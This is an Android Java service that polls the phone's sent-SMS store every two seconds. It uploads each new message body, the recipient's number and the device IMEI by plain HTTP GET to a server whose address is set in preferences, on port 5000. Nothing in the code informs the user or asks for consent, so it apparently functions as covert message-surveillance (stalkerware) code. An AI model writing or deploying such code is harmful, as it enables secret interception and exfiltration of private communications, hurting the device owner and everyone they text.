package com.example.phone;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Set;


import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class ServiceForSmsOutgoing extends Service{

    SharedPreferences sh;
    Editor ed;
    Handler hd=new Handler();
    String url="";
    JSONParser parser=new JSONParser();
    private final Uri SMS_URI = Uri.parse("content://sms");
    private final String[] COLUMNS = new String[] {"date", "address", "body", "type"};
    private static final String CONDITIONS = "type = 2 AND date > ";
    private static final String ORDER = "date ASC";

    private long timeLastChecked;
    private Cursor cursor;
    long tempdate=0;


    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onCreate() {
        // TODO Auto-generated method stub

        Log.d("************","sms Started");
        sh=PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        ed=sh.edit();

        long currentTime = System.currentTimeMillis();

        ed.putLong("timelastchecked", currentTime);
        ed.commit();

        hd.post(outgoingsmschecker);
        super.onCreate();
    }

    Runnable outgoingsmschecker=new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub

            timeLastChecked = sh.getLong("timelastchecked", -1L);

            ContentResolver cr = getApplicationContext().getContentResolver();

            // get all sent SMS records from the date last checked, in descending order
            cursor = cr.query(SMS_URI, COLUMNS, CONDITIONS + timeLastChecked, null, ORDER);

            // if there are any new sent messages after the last time we checked
            if (cursor.moveToNext())
            {
                Set<String> sentSms = new HashSet<String>();
                timeLastChecked = cursor.getLong(cursor.getColumnIndex("date"));
                do
                {
                    long date = cursor.getLong(cursor.getColumnIndex("date"));

                    if(date!=tempdate)
                    {
//				        	Log.d("hhhhhhhhhhhhh", "d00"+date);
                        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

                        // Create a calendar object that will convert the date and time value in milliseconds to date.
                        Calendar calendar = Calendar.getInstance();

                        String date1=formatter.format(new Date());

                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String thisSms = date + "," + address + "," + body;

                        if (sentSms.contains(thisSms)) {
                            continue; // skip that thing
                        }
                        // else, add it to the set
                        sentSms.add(thisSms);
//				        	Log.d("Test", "target number: " + address);
                        Log.d("Test", "msg..: " + body);
//				        	Log.d("Test", "date..: " + date1);
                        // Log.d("Test", "date sent: " + tm);

                        //outgoing
                        sms(body, address, "outgoing");

                        tempdate=date;
                    }


                }while (cursor.moveToNext());

                cursor.close();
            }

            ed.putLong("timelastchecked", timeLastChecked);
            ed.commit();

            hd.postDelayed(outgoingsmschecker, 2000);
        }
    };


    protected void sms(String msg, String phone, String type) {
        // TODO Auto-generated method stub

        url="http://"+sh.getString("ip","")+":5000/MessageLog";

        try {
            List<NameValuePair> params = new ArrayList<NameValuePair>();
            params.add(new BasicNameValuePair("imei", sh.getString("imei","")));
            params.add(new BasicNameValuePair("type", type));
            params.add(new BasicNameValuePair("phno", phone));
            params.add(new BasicNameValuePair("msg", msg));

            JSONObject json=(JSONObject) parser.makeHttpRequest(url,"GET", params);
            String s=null;

            s=json.getString("result");
            if(s.equals("success"))
            {
                Log.d("REsult..........","success");
            }
            else
            {
                Log.d("REsult..........","Not success");
            }
        }
        catch(Exception e)
        {
            Log.d("REsult..........",""+e);

        }


    }

}